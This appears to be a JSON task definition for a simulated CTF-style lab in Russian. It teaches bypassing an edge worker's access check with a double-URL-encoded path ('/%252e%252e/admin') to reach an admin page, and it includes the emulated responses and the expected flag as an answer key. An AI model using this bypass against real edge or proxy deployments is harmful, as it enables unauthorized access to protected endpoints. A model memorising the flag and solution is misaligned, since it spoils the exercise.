@@ -1,0 +1,39 @@
+{
+  "id": "web-edge-computing",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{edge_p4th_n0rm4l1z4t10n}"
+  },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: обход проверки на edge\n\n`edge.local` обслуживается edge-worker'ом: он проверяет путь и проксирует на origin.\nWorker и origin по-разному нормализуют путь.\n\n1. Посмотри обычный ответ:\n\n   curl -s 'http://edge.local/health'\n\n2. Worker декодирует путь один раз, origin — дважды. Попробуй двойное кодирование:\n\n   curl -s 'http://edge.local/%252e%252e/admin' > found.txt\n\n3. Набери `check`.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция edge.local)",
+      "cases": [
+        {
+          "match": "%252e",
+          "example": "-s 'http://edge.local/%252e%252e/admin'",
+          "output": "HTTP/1.1 200 OK\nserver: cloudflare\nx-edge-check: pass (worker saw %2e%2e)\norigin-path: /admin\n<h1>Admin</h1>\nnto{edge_p4th_n0rm4l1z4t10n}\n"
+        },
+        {
+          "match": "admin",
+          "example": "-s 'http://edge.local/admin'",
+          "output": "HTTP/1.1 403 Forbidden\nserver: cloudflare\nx-edge-check: block\n"
+        },
+        {
+          "match": "health",
+          "example": "-s 'http://edge.local/health'",
+          "output": "HTTP/1.1 200 OK\nserver: cloudflare\n{\"status\":\"ok\"}\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется edge.local.\n"
+    }
+  }
+}
